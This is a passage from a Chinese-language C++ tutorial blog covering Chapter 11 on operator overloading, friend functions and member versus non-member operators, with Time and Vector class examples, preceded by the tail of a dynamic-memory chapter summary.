(Rule of Three, C++11 前): 如果你需要自定义析构函数、复制构造函数或复制赋值运算符中的任何一个，你几乎肯定需要全部三个。 五法则 (Rule of Five, C++11 及以后): 随着移动语义的引入，如果需要自定义上述三个或移动构造函数/移动赋值运算符中的任何一个，通常需要考虑所有五个。 改进的 String 类: 通过实现自定义的析构函数、复制构造函数和赋值运算符（执行深复制），我们创建了一个能够安全管理动态内存的 String 类。 构造函数中使用 new 的注意事项: 必须在析构函数中配对使用 delete 或 delete[]。 new 可能失败并抛出 std::bad_alloc 异常。如果构造函数在 new 失败前已分配其他资源，需要注意资源泄漏问题（析构函数不会被调用）。使用 RAII（如智能指针）是更安全的做法。 如果类的成员是其他类的对象，默认的复制/赋值操作会调用成员对象的相应复制/赋值操作。如果成员对象能正确处理自己的资源，这通常是安全的。 返回对象: 按引用返回 (&amp; 或 const &amp;): 高效，用于返回已存在的对象，但不能返回局部变量的引用。 按值返回 (ClassName): 安全，返回副本或移动后的对象。现代 C++ 通过 RVO/NRVO 和移动语义使其通常足够高效。 指向对象的指针: 使用 new 动态创建对象，返回对象指针。 使用 delete 销毁对象（调用析构函数并释放内存）。 使用 new[] 和 delete[] 处理动态对象数组。 使用箭头运算符 -&gt; 访问指针指向对象的成员。 定位 new (placement new): 在预先分配好的内存地址上构造对象，需要显式调用析构函数 (ptr-&gt;~ClassName()) 来销毁对象，内存需另外管理。 静态类成员: 静态数据成员: 被类的所有对象共享，独立于任何对象存在，通常在类外初始化。 静态成员函数: 不与特定对象关联（无 this 指针），只能访问静态成员，可通过类名调用 (ClassName::static_func())。 队列模拟: 演示了如何应用类和动态内存管理（链表实现的队列）来解决一个实际的模拟问题。 现代 C++ 建议 (Rule of Zero): 尽可能使用标准库提供的资源管理类（如 std::string, std::vector, std::unique_ptr, std::shared_ptr），它们遵循 RAII 原则并正确实现了复制/移动语义。如果你的类只使用这些工具来管理资源，通常就不需要编写任何自定义的特殊成员函数（零法则），从而使代码更简单、更安全。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 11 使用类","slug":"Cpp_tutorial_Chapter_11","date":"2025-04-30T15:42:24.000Z","updated":"2025-04-30T15:39:48.106Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_11/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_11/","excerpt":"","text":"11.1 运算符重载C++ 允许将运算符（如 +, -, *, /, &lt;&lt;, &gt;&gt;, == 等）应用于类对象，就像它们是内置类型（如 int 或 double）一样。这种特性称为**运算符重载 (Operator Overloading)**。 目的: 运算符重载的主要目的是提高代码的可读性和直观性。通过重载运算符，我们可以让我们自己定义的类（比如表示复数、向量、时间或字符串的类）能够使用熟悉的运算符进行操作，使得代码更接近自然语言或数学表示法。 例如，假设你有一个表示二维向量的类 Vector。如果没有运算符重载，你可能需要这样写代码来计算两个向量的和： 123Vector v1(1.0, 2.0);Vector v2(3.0, 4.0);Vector sum = v1.add(v2); // 使用名为 add 的成员函数 通过重载 + 运算符，你可以写出更自然、更简洁的代码： 123Vector v1(1.0, 2.0);Vector v2(3.0, 4.0);Vector sum = v1 + v2; // 使用重载的 + 运算符 如何实现: 运算符重载是通过编写特殊的运算符函数 (Operator Functions) 来实现的。运算符函数的名称格式为 operator 关键字后跟要重载的运算符符号。例如，重载加法运算符 + 的函数名为 operator+，重载小于运算符 &lt; 的函数名为 operator&lt;。 运算符函数可以被定义为： 类的成员函数 (Member Function): 当运算符函数是成员函数时，它的第一个操作数隐式地是调用该函数的对象（通过 this 指针访问）。 对于二元运算符（如 +, -, *），成员函数只需要一个显式参数（代表右操作数）。 对于一元运算符（如 - (负号), ++ (前缀)），成员函数没有显式参数。 非成员函数 (Non-member Function): 通常将非成员运算符函数声明为类的**友元 (friend)**，以便它可以访问类的私有成员。 对于二元运算符，非成员函数需要两个显式参数（分别代表左操作数和右操作数）。 对于一元运算符，非成员函数需要一个显式参数。 基本语法 (以二元运算符 + 为例): 作为成员函数: 1234567891011121314151617181920class MyClass &#123;public: // ... 其他成员 ... // 声明重载的 + 运算符 (成员函数) // other 是右操作数对象 MyClass operator+(const MyClass&amp; other) const;&#125;;// 定义MyClass MyClass::operator+(const MyClass&amp; other) const &#123; MyClass result; // 实现加法逻辑，通常涉及 this 对象和 other 对象 // result.data = this-&gt;data + other.data; // 假设有 data 成员 return result;&#125;// 使用MyClass obj1, obj2;MyClass sum = obj1 + obj2; // 实际调用 obj1.operator+(obj2) 作为非成员函数 (通常是友元): 1234567891011121314151617181920class MyClass &#123; // ... 私有成员 ...public: // ... 其他公有成员 ... // 声明友元函数来重载 + 运算符 friend MyClass operator+(const MyClass&amp; left, const MyClass&amp; right);&#125;;// 定义 (非成员函数，不需要 MyClass::)MyClass operator+(const MyClass&amp; left, const MyClass&amp; right) &#123; MyClass result; // 实现加法逻辑，访问 left 和 right 对象的成员 (需要友元权限访问私有成员) // result.data = left.data + right.data; // 假设有 data 成员 return result;&#125;// 使用MyClass obj1, obj2;MyClass sum = obj1 + obj2; // 实际调用 operator+(obj1, obj2) 注意事项: 不能创建新的运算符: 你只能重载 C++ 中已有的运算符，不能发明新的运算符（比如 ** 或 ##）。 不能改变运算符的优先级或结合性: 重载 + 和 * 后，* 的优先级仍然高于 +。 不能改变运算符的操作数个数: 不能将二元运算符重载为一元运算符，反之亦然。 至少一个操作数是用户定义类型: 不能为两个内置类型（如 int 和 int）重载运算符。运算符重载必须涉及至少一个类对象（或枚举类型）。 某些运算符不能重载: . (成员访问运算符) .* (成员指针访问运算符) :: (作用域解析运算符) sizeof (大小运算符) ?: (条件运算符) typeid (运行时类型识别运算符) static_cast, dynamic_cast, const_cast, reinterpret_cast (类型转换运算符，虽然 operator type() 形式的转换函数可以定义) 运算符重载是 C++ 提供的一个强大工具，可以使自定义类的使用更加自然和方便。然而，也应谨慎使用，避免过度或不直观的重载，以免降低代码的可读性。接下来的章节将通过具体的例子来演示如何重载不同的运算符。 11.2 计算时间：一个运算符重载示例为了具体说明运算符重载的过程和用法，让我们创建一个简单的 Time 类来表示时间（小时和分钟），并为其重载一些运算符。 基础 Time 类: 首先，我们定义一个基础的 Time 类，包含小时和分钟，一个构造函数来初始化时间，以及一个 show() 方法来显示时间。 12345678910111213141516171819202122232425// time.h -- Time 类定义#ifndef TIME_H_#define TIME_H_#include &lt;iostream&gt;class Time &#123;private: int hours; int minutes;public: // 构造函数，默认值为 0 时 0 分 Time(int h = 0, int m = 0); // 添加分钟数的方法 (内部会处理进位) void AddMin(int m); // 添加小时数的方法 void AddHr(int h); // 重置时间为 0 时 0 分 void Reset(int h = 0, int m = 0); // 显示时间 void Show() const;&#125;;#endif // TIME_H_ 123456789101112131415161718192021222324252627// time.cpp -- Time 类方法实现#include &quot;time.h&quot;Time::Time(int h, int m) &#123; hours = h; minutes = m; // 可以添加一些验证逻辑，例如确保分钟数小于60&#125;void Time::AddMin(int m) &#123; minutes += m; hours += minutes / 60; // 整数除法，计算增加的小时数 minutes %= 60; // 取模，得到剩余的分钟数&#125;void Time::AddHr(int h) &#123; hours += h;&#125;void Time::Reset(int h, int m) &#123; hours = h; minutes = m;&#125;void Time::Show() const &#123; std::cout &lt;&lt; hours &lt;&lt; &quot; hours, &quot; &lt;&lt; minutes &lt;&lt; &quot; minutes&quot;;&#125; 这个基础类允许我们创建 Time 对象并对其进行一些基本操作，但还不能直接使用 + 等运算符。 11.2.1 添加加法运算符我们希望能够像 total = time1 + time2; 这样将两个 Time 对象相加。为此，我们需要重载 + 运算符。我们将它实现为 Time 类的成员函数。 在 time.h 中添加声明: 1234567891011121314151617181920212223// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... (包含 guards 和 iostream) ...class Time &#123;private: int hours; int minutes;public: Time(int h = 0, int m = 0); void AddMin(int m); void AddHr(int h); void Reset(int h = 0, int m = 0); void Show() const; // 重载加法运算符 (+) 作为成员函数 // 参数 t 代表加号右边的 Time 对象 // const 关键字表示这个函数不会修改调用它的对象 (加号左边的对象) // 返回一个新的 Time 对象作为结果 Time operator+(const Time &amp; t) const;&#125;;// ... (endif) ... 在 time.cpp 中添加定义: 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp#include &quot;time.h&quot;// ... (构造函数和其他方法的定义) ...// 定义重载的加法运算符Time Time::operator+(const Time &amp; t) const &#123; Time sum; // 创建一个临时的 Time 对象来存储结果 sum.minutes = minutes + t.minutes; // 将两个对象的分钟数相加 sum.hours = hours + t.hours + sum.minutes / 60; // 将小时数相加，并加上分钟进位的小时 sum.minutes %= 60; // 调整结果的分钟数 return sum; // 返回结果对象&#125; 使用重载的 + 运算符: 1234567891011121314151617181920212223242526272829// main.cpp -- 使用 Time 类和重载的 +#include &lt;iostream&gt;#include &quot;time.h&quot;int main() &#123; Time planning(2, 40); // 2 小时 40 分钟 Time coding(5, 55); // 5 小时 55 分钟 Time fixing(1, 30); // 1 小时 30 分钟 Time total; std::cout &lt;&lt; &quot;Planning time = &quot;; planning.Show(); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Coding time = &quot;; coding.Show(); std::cout &lt;&lt; std::endl; // 使用重载的 + 运算符 std::cout &lt;&lt; &quot;Calculating total time...\\n&quot;; total = planning + coding + fixing; // 相当于 (planning.operator+(coding)).operator+(fixing) // 显示总时间 std::cout &lt;&lt; &quot;Total time = &quot;; total.Show(); std::cout &lt;&lt; std::endl; return 0;&#125; 编译和运行:(需要将 main.cpp 和 time.cpp 一起编译链接) 输出: 1234Planning time &#x3D; 2 hours, 40 minutesCoding time &#x3D; 5 hours, 55 minutesCalculating total time...Total time &#x3D; 10 hours, 5 minutes 可以看到，通过重载 + 运算符，我们可以用非常自然的方式将 Time 对象相加。 11.2.2 重载限制重载运算符时必须遵守一些规则和限制： 不能创建新运算符: 只能重载 C++ 已有的运算符。 不能改变运算符优先级和结合性: * 总是优先于 +。 不能改变运算符操作数个数: 二元运算符（如 +）必须接受两个操作数，一元运算符（如 - (负号)）必须接受一个操作数。 至少一个操作数是用户定义类型: 不能为两个 int 重载 + 运算符。重载必须涉及至少一个类对象（或枚举）。 特定运算符不能重载: 如 .、::、sizeof、?: 等。 保持直观性: 重载应该符合运算符的通常含义。例如，用 + 来表示两个对象的相减会非常令人困惑。虽然语法上允许，但这是不良实践。 11.2.3 其他重载运算符我们可以为 Time 类重载更多的运算符，使其功能更完善。 重载减法运算符 (-) 作为成员函数: 1234567891011// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... existing code ...class Time &#123; // ... existing members ...public: // ... existing methods ... Time operator+(const Time &amp; t) const; // 声明重载减法运算符 (-) Time operator-(const Time &amp; t) const;&#125;;// ... existing code ... 1234567891011121314151617181920// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp// ... existing code ...// 定义重载的减法运算符Time Time::operator-(const Time &amp; t) const &#123; Time diff; int tot1, tot2; // 将时间都转换为总分钟数进行计算 tot1 = t.minutes + 60 * t.hours; tot2 = minutes + 60 * hours; // 确保结果非负 (简单处理，实际可能需要更复杂的逻辑) if (tot2 &lt; tot1) &#123; std::cerr &lt;&lt; &quot;Warning: subtraction result is negative. Resetting to 0.\\n&quot;; diff.hours = diff.minutes = 0; &#125; else &#123; diff.minutes = (tot2 - tot1) % 60; diff.hours = (tot2 - tot1) / 60; &#125; return diff;&#125; 重载乘法运算符 (*) - 时间乘以一个因子: 假设我们想计算 Time 对象乘以一个 double 因子（例如，将时间放大 1.5 倍）。这个运算符的操作数类型不同（Time 和 double），可以作为成员函数或非成员函数实现。这里我们作为成员函数实现。 123456789101112// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... existing code ...class Time &#123; // ... existing members ...public: // ... existing methods ... Time operator+(const Time &amp; t) const; Time operator-(const Time &amp; t) const; // 声明重载乘法运算符 (*) Time operator*(double mult) const;&#125;;// ... existing code ... 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp// ... existing code ...// 定义重载的乘法运算符Time Time::operator*(double mult) const &#123; Time result; // 将时间转换为总分钟数，乘以因子，然后转换回小时和分钟 long totalminutes = hours * 60 + minutes; totalminutes *= mult; // 乘以因子 result.hours = totalminutes / 60; result.minutes = totalminutes % 60; return result;&#125; 使用示例: 123456789101112131415161718192021222324// main.cpp (续)#include &lt;iostream&gt;#include &quot;time.h&quot;int main() &#123; Time t1(2, 30); // 2 hours, 30 minutes Time t2(1, 45); // 1 hours, 45 minutes Time diff, product; double factor = 1.5; std::cout &lt;&lt; &quot;t1 = &quot;; t1.Show(); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;t2 = &quot;; t2.Show(); std::cout &lt;&lt; std::endl; diff = t1 - t2; // 使用重载的 - std::cout &lt;&lt; &quot;t1 - t2 = &quot;; diff.Show(); std::cout &lt;&lt; std::endl; product = t1 * factor; // 使用重载的 * std::cout &lt;&lt; &quot;t1 * &quot; &lt;&lt; factor &lt;&lt; &quot; = &quot;; product.Show(); std::cout &lt;&lt; std::endl; // 注意：我们没有定义 double * Time，所以下面的写法会报错 // product = factor * t1; // 错误! 需要非成员函数或转换函数 return 0;&#125; 输出 (续): 1234t1 &#x3D; 2 hours, 30 minutest2 &#x3D; 1 hours, 45 minutest1 - t2 &#x3D; 0 hours, 45 minutest1 * 1.5 &#x3D; 3 hours, 45 minutes 这个例子展示了如何通过重载运算符，让自定义的 Time 类能够以更自然、更符合数学直觉的方式进行运算。下一节将讨论友元函数，特别是如何使用友元函数来重载像 &lt;&lt; 这样的输出运算符，以及处理像 double * Time 这样的运算顺序问题。 11.3 友元通常，类的私有成员（private）只能被该类的成员函数访问。这是 C++ 实现封装和数据隐藏的关键机制。然而，在某些特殊情况下，允许特定的非成员函数或其他类访问一个类的私有成员会非常方便。C++ 提供了友元 (friend) 机制来实现这种受控的访问。 什么是友元？ 友元是 C++ 中的一种机制，它允许一个类授予非成员函数或另一个类访问其 private 和 protected 成员的权限。被授予权限的函数或类被称为该类的友元。 注意: 友元关系是单向的，并且不能被继承。如果类 A 将函数 func() 声明为友元，func() 可以访问 A 的私有成员，但这并不意味着 A 可以访问 func() 的内部（如果 func 是另一个类的成员），也不意味着 A 的派生类会自动将 func() 视为友元。 11.3.1 创建友元要将一个函数或另一个类声明为当前类的友元，需要在当前类的定义内部使用 friend 关键字进行声明。 1. 友元函数 (Friend Function): 友元函数可以是普通的非成员函数，也可以是另一个类的成员函数。 声明普通非成员函数为友元: 1234567891011121314151617181920class MyClass &#123;private: int secret;public: MyClass(int s = 0) : secret(s) &#123;&#125; // 在类定义内部声明友元函数 friend void showSecret(const MyClass&amp; obj);&#125;;// 定义友元函数 (注意：它不是成员函数，没有 MyClass::)void showSecret(const MyClass&amp; obj) &#123; // 因为是 MyClass 的友元，所以可以访问其私有成员 secret std::cout &lt;&lt; &quot;The secret is: &quot; &lt;&lt; obj.secret &lt;&lt; std::endl;&#125;int main() &#123; MyClass myObj(42); showSecret(myObj); // 调用友元函数 return 0;&#125; 声明另一个类的成员函数为友元: (需要注意声明顺序和前向声明) 123456789101112131415161718192021222324252627282930// 前向声明 ClassB，因为 ClassA 的友元声明中用到了它class ClassB;class ClassA &#123;private: int dataA;public: ClassA(int d = 0) : dataA(d) &#123;&#125; // 声明 ClassB 的成员函数 memberB 为友元 friend void ClassB::memberB(const ClassA&amp; a);&#125;;class ClassB &#123;public: // ClassB 的成员函数，它将是 ClassA 的友元 void memberB(const ClassA&amp; a);&#125;;// 定义 ClassB::memberBvoid ClassB::memberB(const ClassA&amp; a) &#123; // 可以访问 ClassA 的私有成员 dataA std::cout &lt;&lt; &quot;Accessing ClassA data from ClassB: &quot; &lt;&lt; a.dataA &lt;&lt; std::endl;&#125;int main() &#123; ClassA objA(10); ClassB objB; objB.memberB(objA); // 调用 ClassB 的成员函数，该函数是 ClassA 的友元 return 0;&#125; 2. 友元类 (Friend Class): 一个类可以将另一个整个类声明为友元。这样，友元类的所有成员函数都可以访问声明它为友元的那个类的 private 和 protected 成员。 1234567891011121314151617181920212223class Storage &#123;private: int value; friend class Controller; // 声明 Controller 为友元类public: Storage(int v = 0) : value(v) &#123;&#125;&#125;;class Controller &#123;public: void manipulateStorage(Storage&amp; s, int newValue) &#123; // 因为 Controller 是 Storage 的友元，可以访问其私有成员 value s.value = newValue; std::cout &lt;&lt; &quot;Storage value changed to: &quot; &lt;&lt; s.value &lt;&lt; std::endl; &#125;&#125;;int main() &#123; Storage myStorage(5); Controller myController; myController.manipulateStorage(myStorage, 99); // Controller 的方法可以修改 Storage 的私有数据 return 0;&#125; 11.3.2 常用的友元：重载 &lt;&lt; 运算符运算符重载最常见的应用之一就是重载**输出运算符 &lt;&lt;**，以便能够直接使用 cout 来打印对象的信息，例如 cout &lt;&lt; myTimeObject;。 为什么通常需要友元？ 考虑 cout &lt;&lt; myTimeObject; 这个表达式。 它实际上是调用一个形式为 operator&lt;&lt;(cout, myTimeObject) 的函数。 这个运算符的左操作数是 cout（一个 ostream 类型的对象），右操作数是我们要打印的对象（比如 Time 类型的对象）。 如果我们尝试将 operator&lt;&lt; 定义为 Time 类的成员函数，那么它的调用形式会是 myTimeObject.operator&lt;&lt;(cout)。这意味着 myTimeObject 必须是左操作数，而 cout 是右操作数，即 myTimeObject &lt;&lt; cout。这显然不符合我们习惯的用法。 因此，operator&lt;&lt; 必须被重载为非成员函数。但是，这个非成员函数通常需要访问类的私有数据成员（如 Time 类的 hours 和 minutes）来打印它们。这就使得将 operator&lt;&lt; 声明为类的友元函数成为最自然、最常用的解决方案。 为 Time 类重载 &lt;&lt;: 在 time.h 中声明友元函数: 12345678910111213141516171819202122// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... (包含 guards 和 iostream) ...class Time &#123; // ... private members ...public: // ... constructors and other methods ... Time operator+(const Time &amp; t) const; Time operator-(const Time &amp; t) const; Time operator*(double mult) const; // 声明友元函数 operator&lt;&lt; // 第一个参数是 ostream 对象的引用 (如 cout) // 第二个参数是要打印的 Time 对象的 const 引用 // 返回 ostream 对象的引用，以支持链式输出 (cout &lt;&lt; t1 &lt;&lt; t2) friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t); // 不再需要 Show() 方法，因为 &lt;&lt; 提供了更好的方式 // void Show() const;&#125;;// ... (endif) ... 在 time.cpp 中定义友元函数: (注意：没有 Time:: 前缀) 1234567891011121314// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp#include &quot;time.h&quot; // 确保包含了 time.h// ... (构造函数和其他方法的定义) ...// 定义友元函数 operator&lt;&lt;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t) &#123; // 因为是友元，可以访问 t 的私有成员 hours 和 minutes os &lt;&lt; t.hours &lt;&lt; &quot; hours, &quot; &lt;&lt; t.minutes &lt;&lt; &quot; minutes&quot;; return os; // 返回 ostream 引用&#125;// 如果删除了 Show()，需要移除它的定义// void Time::Show() const &#123; ... &#125; 使用重载的 &lt;&lt;: 12345678910111213141516171819// main.cpp -- 使用重载的 &lt;&lt;#include &lt;iostream&gt;#include &quot;time.h&quot;int main() &#123; Time t1(3, 45); Time t2(2, 15); Time sum = t1 + t2; // 使用重载的 &lt;&lt; 运算符输出 std::cout &lt;&lt; &quot;Time t1: &quot; &lt;&lt; t1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Time t2: &quot; &lt;&lt; t2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 链式输出 std::cout &lt;&lt; &quot;t1 + t2 = &quot; &lt;&lt; t1 + t2 &lt;&lt; std::endl; return 0;&#125; 输出: 1234Time t1: 3 hours, 45 minutesTime t2: 2 hours, 15 minutesSum: 6 hours, 0 minutest1 + t2 &#x3D; 6 hours, 0 minutes 处理 double * Time (友元函数方式): 在上一节中，我们定义了 Time operator*(double mult) const; 作为成员函数，可以处理 time * double 的情况，但不能处理 double * time。我们可以通过添加一个非成员友元函数来解决这个问题。 在 time.h 中添加友元声明: 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... existing code ...class Time &#123; // ... existing members ...public: // ... existing methods ... Time operator*(double mult) const; // 处理 time * double // 友元函数处理 double * time friend Time operator*(double m, const Time &amp; t); friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t);&#125;;// ... existing code ... 在 time.cpp 中添加友元定义: 1234567891011121314// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp// ... existing code ...// 定义友元函数 operator* (double * Time)// 通常可以简单地调用已有的成员函数版本Time operator*(double m, const Time &amp; t) &#123; // return t.operator*(m); // 直接调用成员函数 return t * m; // 或者更简洁地使用已重载的 Time * double 运算符&#125;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t) &#123; os &lt;&lt; t.hours &lt;&lt; &quot; hours, &quot; &lt;&lt; t.minutes &lt;&lt; &quot; minutes&quot;; return os;&#125; 现在，double * time 的运算也可以正常工作了： 12345678// main.cppTime t1(2, 0);double factor = 2.5;Time product1 = t1 * factor; // 调用成员函数 t1.operator*(factor)Time product2 = factor * t1; // 调用友元函数 operator*(factor, t1)std::cout &lt;&lt; product1 &lt;&lt; std::endl; // 输出: 5 hours, 0 minutesstd::cout &lt;&lt; product2 &lt;&lt; std::endl; // 输出: 5 hours, 0 minutes 总结: 友元（函数或类）被授予访问声明其为友元的类的私有和保护成员的权限。 使用 friend 关键字在类定义内部声明友元。 友元对于重载某些运算符（尤其是需要访问私有成员且不能作为成员函数的运算符，如 &lt;&lt;）非常有用。 友元也用于实现需要紧密协作但又不适合放在同一个类中的功能。 虽然友元打破了纯粹的封装，但它提供了一种受控的、明确的方式来在必要时绕过访问限制。应谨慎使用，避免滥用。 11.4 重载运算符：作为成员函数还是非成员函数在重载运算符时，一个关键的决定是将其实现为类的成员函数还是非成员函数（通常是友元）。这个选择会影响函数的调用方式、参数列表以及某些情况下的行为。 核心区别回顾: 成员函数: 通过类的对象调用。 左操作数隐式地是调用该函数的对象（通过 this 指针访问）。 对于二元运算符，它只需要一个显式参数（右操作数）。 对于一元运算符，它没有显式参数。 可以直接访问类的 private 和 protected 成员。 示例：obj1 + obj2 调用 obj1.operator+(obj2)。 非成员函数: 独立于类定义之外（但通常在同一个头文件或源文件中）。 所有操作数都必须作为显式参数传递。 对于二元运算符，它需要两个显式参数（左、右操作数）。 对于一元运算符，它需要一个显式参数。 如果需要访问类的 private 或 protected 成员，必须被声明为该类的**友元 (friend)**。 示例：obj1 + obj2 调用 operator+(obj1, obj2)。 选择指南: 以下是一些通用指南和特定运算符的惯例： 必须是成员函数的运算符: 以下运算符只能通过成员函数进行重载： = (赋值运算符) [] (下标运算符) () (函数调用运算符) -&gt; (成员访问运算符) 任何类型转换运算符 (如 operator int()) 通常作为成员函数的运算符 (修改对象状态): 对于那些通常会修改其左操作数对象状态的运算符，将它们实现为成员函数通常更自然。这包括： 复合赋值运算符: +=, -=, *=, /=, %=, &amp;=, |=, ^=, &lt;&lt;=, &gt;&gt;= 例如，time1 += time2; 直观地表示修改 time1。实现为 time1.operator+=(time2) 很合适。 递增/递减运算符: ++, -- (前缀和后缀) 例如，++myCounter; 或 myCounter++; 修改 myCounter 对象。 123456789101112131415// 示例：重载 += 作为成员函数class Time &#123; // ... private members ...public: // ... other methods ... Time&amp; operator+=(const Time&amp; t); // 返回引用以支持链式赋值&#125;;Time&amp; Time::operator+=(const Time&amp; t) &#123; // 将 t 加到 *this 对象上 this-&gt;minutes += t.minutes; this-&gt;hours += t.hours + this-&gt;minutes / 60; this-&gt;minutes %= 60; return *this; // 返回修改后的对象自身的引用&#125; 通常作为非成员函数 (通常是友元) 的运算符: 对于那些不修改操作数状态（而是创建一个新值）或者需要对称处理操作数（允许不同类型的左操作数）的运算符，通常将它们实现为非成员函数（通常是友元）。 二元算术运算符: +, -, *, /, % 虽然 + 也可以作为成员函数（如 11.2 节所示），但作为非成员友元函数可以提供更好的对称性。例如，如果类允许从 double 到 Time 的隐式转换（通常不推荐，但可能存在），那么友元函数 operator+(const Time&amp;, const Time&amp;) 可以处理 time + time、time + double 和 double + time（通过转换），而成员函数只能处理 time + time 和 time + double。 对于像 double * Time 这样的混合类型运算，如果想让 double 作为左操作数，则必须使用非成员函数（如 11.3 节所示）。 关系运算符: ==, !=, &lt;, &gt;, &lt;=, &gt;= 将它们实现为非成员友元可以更容易地处理对称性，并可能允许混合类型的比较（如果定义了适当的转换或重载版本）。 位运算符: &amp;, |, ^ 逻辑运算符: &amp;&amp;, || (较少重载) 输入/输出运算符: &lt;&lt;, &gt;&gt; 必须是非成员函数，因为左操作数是 ostream 或 istream 对象，而不是你的类的对象。它们几乎总是需要成为友元以访问私有数据进行读写。 123456789101112// 示例：重载 == 作为非成员友元函数class Time &#123; // ... private members ...public: // ... methods ... friend bool operator==(const Time&amp; t1, const Time&amp; t2); // ... other friends ...&#125;;bool operator==(const Time&amp; t1, const Time&amp; t2) &#123; return (t1.hours == t2.hours &amp;&amp; t1.minutes == t2.minutes);&#125; 总结: 运算符类型 推荐实现方式 原因 =, [], (), -&gt;, type() 必须是成员函数 C++ 语言规定 +=, -=, *=, etc. 成员函数 通常修改左操作数对象的状态 ++, -- 成员函数 修改对象状态 +, -, *, /, % 非成员友元 (或成员) 对称性，允许混合类型左操作数 (如果需要)，通常不修改操作数 ==, !=, &lt;, &gt;, &lt;=, &gt;= 非成员友元 (或成员) 对称性 &lt;&lt;, &gt;&gt; 必须是非成员友元 左操作数是流对象 (ostream, istream)，需要访问私有成员 一元 +, -, *, &amp;, !, ~ 成员或非成员友元 成员函数无参数，非成员函数一个参数 选择依据: 强制要求: 某些运算符必须是成员函数。 左操作数类型: 如果左操作数必须是特定类型（如 ostream），则必须使用非成员函数。 状态修改: 如果运算符主要目的是修改左操作数的状态，成员函数通常更自然。 对称性/类型转换: 如果希望运算符对操作数顺序具有对称性，或者希望允许对左操作数进行隐式类型转换（需谨慎），非成员函数（通常是友元）是更好的选择。 在实践中，对于常见的二元运算符如 +, -, *, /，一种常见的模式是： 将复合赋值运算符（如 +=, -=）实现为成员函数。 将对应的二元运算符（如 +, -）实现为非成员友元函数，并在其内部调用复合赋值运算符来完成实际工作。 1234567891011121314151617181920// 示例模式class Time &#123; // ...public: Time&amp; operator+=(const Time&amp; t); // 成员函数 friend Time operator+(const Time&amp; t1, const Time&amp; t2); // 非成员友元 // ...&#125;;Time&amp; Time::operator+=(const Time&amp; t) &#123; // ... 实现 += 逻辑 ... return *this;&#125;// operator+ 调用 operator+=Time operator+(const Time&amp; t1, const Time&amp; t2) &#123; Time sum = t1; // 创建一个副本 sum += t2; // 使用成员函数 += return sum; // 返回结果&#125; 这种模式可以减少代码重复。 11.5 再读重载：一个矢量类本节我们将通过定义一个表示二维矢量（或向量）的类，进一步探讨运算符重载的应用。矢量既可以用直角坐标 (x, y) 表示，也可以用极坐标 (大小/模, 角度) 表示。我们的 Vector 类将能够存储这两种表示，并允许用户在它们之间切换。 11.5.1 使用状态成员为了同时支持直角坐标和极坐标，我们的 Vector 类需要包含相应的成员： x: x 分量 y: y 分量 mag: 矢量的大小（模） ang: 矢量的角度 同时，我们需要一个状态成员来指示当前对象是以哪种模式表示的（直角坐标或极坐标），以及一些方法来根据一种表示计算另一种表示。 vector.h (类定义) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// filepath: d:\\ProgramData\\files_Cpp\\250424\\vector.h#ifndef VECTOR_H_#define VECTOR_H_#include &lt;iostream&gt;namespace VECTOR &#123; // 将类放入命名空间 class Vector &#123; public: // 枚举类型，用于表示模式：直角坐标(RECT) 或 极坐标(POL) enum Mode &#123;RECT, POL&#125;; private: double x; // x 分量 double y; // y 分量 double mag; // 矢量的大小 (模) double ang; // 矢量的角度 (弧度) Mode mode; // 当前模式 (RECT 或 POL) // 私有辅助函数，用于根据一种表示计算另一种表示 void set_mag(); // 根据 x, y 计算 mag void set_ang(); // 根据 x, y 计算 ang (弧度) void set_x(); // 根据 mag, ang 计算 x void set_y(); // 根据 mag, ang 计算 y public: // 构造函数 Vector(); // 默认构造函数 // 根据指定模式和值构造 Vector(double n1, double n2, Mode form = RECT); // 重置矢量 void reset(double n1, double n2, Mode form = RECT); ~Vector(); // 析构函数 // 获取各分量的值 double xval() const &#123; return x; &#125; double yval() const &#123; return y; &#125; double magval() const &#123; return mag; &#125; double angval() const &#123; // 返回角度 (度) // 将弧度转换为度 if (ang == 0.0 &amp;&amp; x == 0.0 &amp;&amp; y == 0.0) return 0.0; // 处理零向量 else if (ang == 0.0 &amp;&amp; x &gt; 0.0) return 0.0; // x轴正方向 else if (ang == 0.0 &amp;&amp; x &lt; 0.0) return 180.0; // x轴负方向 (atan2会处理) else return ang * 180.0 / 3.141592653589793; // 假设 M_PI 不可用 &#125; // 设置模式 void polar_mode(); // 设置为极坐标模式 void rect_mode(); // 设置为直角坐标模式 // --- 运算符重载 --- // 加法: Vector + Vector Vector operator+(const Vector &amp; b) const; // 减法: Vector - Vector Vector operator-(const Vector &amp; b) const; // 取反: -Vector Vector operator-() const; // 乘法: double * Vector (友元) 或 Vector * double (成员或友元) Vector operator*(double n) const; // --- 友元函数 --- // 乘法: double * Vector friend Vector operator*(double n, const Vector &amp; a); // 输出: cout &lt;&lt; Vector friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Vector &amp; v); &#125;;&#125; // namespace VECTOR#endif // VECTOR_H_ vector.cpp (类实现) 